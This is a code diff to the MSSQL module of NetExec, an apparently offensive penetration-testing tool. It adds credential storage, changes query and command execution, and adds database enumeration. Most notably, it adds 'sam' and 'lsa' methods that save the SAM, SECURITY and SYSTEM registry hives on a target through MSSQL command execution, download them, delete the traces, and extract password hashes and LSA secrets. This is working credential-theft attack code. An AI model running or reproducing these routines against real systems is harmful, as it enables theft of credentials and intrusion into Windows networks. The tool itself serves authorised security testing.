@@ -2,11 +2,11 @@ import os
 import random
 import socket
 import contextlib
-from io import StringIO
 
 from nxc.config import process_secret
 from nxc.connection import connection
 from nxc.connection import requires_admin
+from nxc.helpers.misc import gen_random_string
 from nxc.logger import NXCAdapter
 from nxc.helpers.bloodhound import add_user_bh
 from nxc.helpers.ntlm_parser import parse_challenge
@@ -28,6 +28,7 @@ from impacket.tds import (
     TDS_ENVCHANGE_CHARSET,
     TDS_ENVCHANGE_PACKETSIZE,
 )
+from impacket.examples.secretsdump import LocalOperations, LSASecrets, SAMHashes
 
 
 class mssql(connection):
@@ -206,9 +207,15 @@ class mssql(connection):
                 raise
             self.check_if_admin()
             self.logger.success(f"{self.domain}\\{self.username}:{process_secret(self.password)} {self.mark_pwned()}")
+            self.db.add_credential("plaintext", self.domain, self.username, self.password)
+            user_id = self.db.get_credential("plaintext", domain, self.username, self.password)
+            host_id = self.db.get_hosts(self.host)[0].id
+            self.db.add_loggedin_relation(user_id, host_id)
+
             if not self.args.local_auth and self.username != "":
                 add_user_bh(self.username, self.domain, self.logger, self.config)
             if self.admin_privs:
+                self.db.add_admin_user("plaintext", domain, self.username, self.password, self.host, user_id=user_id)
                 add_user_bh(f"{self.hostname}$", self.domain, self.logger, self.config)
             return True
         except BrokenPipeError:
@@ -237,9 +244,15 @@ class mssql(connection):
                 raise
             self.check_if_admin()
             self.logger.success(f"{self.domain}\\{self.username}:{process_secret(self.nthash)} {self.mark_pwned()}")
+            self.db.add_credential("hash", self.domain, self.username, self.nthash)
+            user_id = self.db.get_credential("hash", domain, self.username, self.nthash)
+            host_id = self.db.get_hosts(self.host)[0].id
+            self.db.add_loggedin_relation(user_id, host_id)
+
             if not self.args.local_auth and self.username != "":
                 add_user_bh(self.username, self.domain, self.logger, self.config)
             if self.admin_privs:
+                self.db.add_admin_user("hash", domain, self.username, self.nthash, self.host, user_id=user_id)
                 add_user_bh(f"{self.hostname}$", self.domain, self.logger, self.config)
             return True
         except BrokenPipeError:
@@ -250,25 +263,26 @@ class mssql(connection):
             self.logger.fail(f"{self.domain}\\{self.username}:{process_secret(self.nthash)} {error_msg if error_msg else ''}")
             return False
 
-    def mssql_query(self):
+    def query(self):
         if self.conn.lastError:
             # Invalid connection
+            self.logger.debug(f"Cannot execute query due to invalid connection: {self.conn.lastError}")
             return None
-        query = self.args.mssql_query
-        self.logger.info(f"Query to run:\n{query}")
+        self.logger.info(f"Query to run: {self.args.query}")
         try:
-            raw_output = self.conn.sql_query(query)
+            raw_output = self.conn.sql_query(self.args.query)
             self.logger.info("Executed MSSQL query")
             self.logger.debug(f"Raw output: {raw_output}")
-            for data in raw_output:
-                if isinstance(data, dict):
+            if self.conn.lastError:
+                self.logger.debug(f"Error during query execution: {self.conn.lastError}")
+                self.logger.fail(self.conn.lastError)
+            else:
+                for data in raw_output:
                     for key, value in data.items():
                         if key:
                             self.logger.highlight(f"{key}:{value}")
                         else:
                             self.logger.highlight(f"{value}")
-                else:
-                    self.logger.fail("Unexpected output")
         except Exception as e:
             self.logger.exception(f"Failed to excuted MSSQL query, reason: {e}")
             return None
@@ -284,6 +298,7 @@ class mssql(connection):
         get_output = True if not self.args.no_output else get_output
         self.logger.debug(f"{get_output=}")
 
+        output = ""
         try:
             exec_method = MSSQLEXEC(self.conn, self.logger)
             output = exec_method.execute(payload)
@@ -292,10 +307,11 @@ class mssql(connection):
             self.logger.fail(f"Execute command failed, error: {e!s}")
             return False
         else:
-            self.logger.success("Executed command via mssqlexec")
-            if output:
-                output_lines = StringIO(output).readlines()
-                for line in output_lines:
+            if self.conn.lastError:
+                self.logger.fail(f"Error during command execution: {self.conn.lastError}")
+            else:
+                self.logger.success("Executed command via mssqlexec")
+                for line in output.splitlines():
                     self.logger.highlight(line.strip())
         return output
 
@@ -435,3 +451,141 @@ class mssql(connection):
 
             so_far += simultaneous
         return entries
+
+    def _qname(self, ident: str) -> str:
+        if ident is None:
+            return "[]"
+        return "[" + str(ident).replace("]", "]]") + "]"
+
+    def list_databases(self):
+        try:
+            q = (
+                "SELECT d.name AS DatabaseName, "
+                "       suser_sname(d.owner_sid) AS Owner "
+                "FROM sys.databases d "
+                "ORDER BY d.name;"
+            )
+            rows = self.conn.sql_query(q) or []
+            if not rows:
+                self.logger.display("No databases returned")
+                return
+
+            self.logger.display("Enumerated databases")
+            self.logger.highlight(f"{'Database Name':<30} {'Owner':<25}")
+            self.logger.highlight(f"{'-' * 30} {'-' * 25}")
+            for r in rows:
+                self.logger.highlight(f"{r.get('DatabaseName', ''):<30} {r.get('Owner', ''):<25}")
+            self.logger.highlight(f"Total: {len(rows)} database(s)")
+        except Exception as e:
+            self.logger.fail(f"Failed to enumerate databases: {e}")
+            self.logger.debug("list_databases error", exc_info=True)
+
+    def database(self):
+        db_arg = self.args.database
+
+        # nxc --database (no value) -> list
+        if db_arg is True or db_arg is None:
+            self.list_databases()
+            return
+
+        # nxc --database <name> -> tables
+        if isinstance(db_arg, str):
+            try:
+                safe = db_arg.replace("'", "''")
+                exists = self.conn.sql_query(f"SELECT 1 FROM sys.databases WHERE name = N'{safe}';")
+                if not exists:
+                    self.logger.fail(f"Database [{db_arg}] does not exist on the server.")
+                    return
+
+                tq = (
+                    f"SELECT t.name AS TableName, t.modify_date "
+                    f"FROM {self._qname(db_arg)}.sys.tables t "
+                    f"ORDER BY t.name;"
+                )
+                rows = self.conn.sql_query(tq) or []
+            except Exception as e:
+                self.logger.fail(f"Insufficient permissions or query error in [{db_arg}]: {e}")
+                self.logger.debug("database() error", exc_info=True)
+                return
+
+            if not rows:
+                self.logger.display(f"Database [{db_arg}] has no user tables.")
+                return
+
+            self.logger.display(f"Tables in database: {db_arg}")
+            self.logger.highlight(f"{'Table Name':<50} {'Last Modified':<25}")
+            self.logger.highlight(f"{'-' * 50} {'-' * 25}")
+            for r in rows:
+                mod = r.get("modify_date", "")
+                if mod and hasattr(mod, "strftime"):
+                    mod = mod.strftime("%Y-%m-%d %H:%M:%S")
+                self.logger.highlight(f"{r.get('TableName', ''):<50} {mod!s:<25}")
+            self.logger.highlight(f"Total: {len(rows)} table(s)")
+            return
+
+    @requires_admin
+    def sam(self):
+        sam_storename = gen_random_string(6)
+        system_storename = gen_random_string(6)
+        dump_command = f"reg save HKLM\\SAM C:\\windows\\temp\\{sam_storename} && reg save HKLM\\SYSTEM C:\\windows\\temp\\{system_storename}"
+        clean_command = f"del C:\\windows\\temp\\{sam_storename} && del C:\\windows\\temp\\{system_storename}"
+        output_filename = self.output_file_template.format(output_folder="sam")
+        try:
+            exec_method = MSSQLEXEC(self.conn, self.logger)
+            exec_method.execute(dump_command)
+            exec_method.get_file(f"C:\\windows\\temp\\{sam_storename}", f"{output_filename}.sam")
+            exec_method.get_file(f"C:\\windows\\temp\\{system_storename}", f"{output_filename}.system")
+            exec_method.execute(clean_command)
+        except Exception as e:
+            self.logger.fail(f"Failed to dump SAM database, error: {e!s}")
+            self.logger.debug(f"Error dumping SAM: {e}", exc_info=True)
+        else:
+            if not (os.path.exists(f"{output_filename}.sam") and os.path.getsize(f"{output_filename}.sam") > 0) \
+                or not (os.path.exists(f"{output_filename}.system") and os.path.getsize(f"{output_filename}.system") > 0):
+                self.logger.fail("SAM or SYSTEM hive could not be dumped, privs may not be sufficient.")
+                return
+            self.logger.display("Dumping SAM hashes")
+            local_operations = LocalOperations(f"{output_filename}.system")
+            boot_key = local_operations.getBootKey()
+            SAM = SAMHashes(
+                f"{output_filename}.sam",
+                boot_key,
+                isRemote=None,
+                perSecretCallback=lambda secret: self.logger.highlight(secret),
+            )
+            SAM.dump()
+            SAM.export(output_filename)
+
+    @requires_admin
+    def lsa(self):
+        security_storename = gen_random_string(6)
+        system_storename = gen_random_string(6)
+        dump_command = f"reg save HKLM\\SECURITY C:\\windows\\temp\\{security_storename} && reg save HKLM\\SYSTEM C:\\windows\\temp\\{system_storename}"
+        clean_command = f"del C:\\windows\\temp\\{security_storename} && del C:\\windows\\temp\\{system_storename}"
+        output_filename = self.output_file_template.format(output_folder="lsa")
+        try:
+            exec_method = MSSQLEXEC(self.conn, self.logger)
+            exec_method.execute(dump_command)
+            exec_method.get_file(f"C:\\windows\\temp\\{security_storename}", f"{output_filename}.security")
+            exec_method.get_file(f"C:\\windows\\temp\\{system_storename}", f"{output_filename}.system")
+            exec_method.execute(clean_command)
+        except Exception as e:
+            self.logger.fail(f"Failed to dump LSA secrets, error: {e!s}")
+            self.logger.debug(f"Error dumping LSA: {e}", exc_info=True)
+        else:
+            if not (os.path.exists(f"{output_filename}.security") and os.path.getsize(f"{output_filename}.security") > 0) \
+                or not (os.path.exists(f"{output_filename}.system") and os.path.getsize(f"{output_filename}.system") > 0):
+                self.logger.fail("SECURITY or SYSTEM hive could not be dumped, privs may not be sufficient.")
+                return
+            self.logger.display("Dumping LSA secrets")
+            local_operations = LocalOperations(f"{output_filename}.system")
+            boot_key = local_operations.getBootKey()
+            LSA = LSASecrets(
+                f"{output_filename}.security",
+                boot_key,
+                None,
+                isRemote=None,
+                perSecretCallback=lambda secret_type, secret: self.logger.highlight(secret),
+            )
+            LSA.dumpCachedHashes()
+            LSA.dumpSecrets()
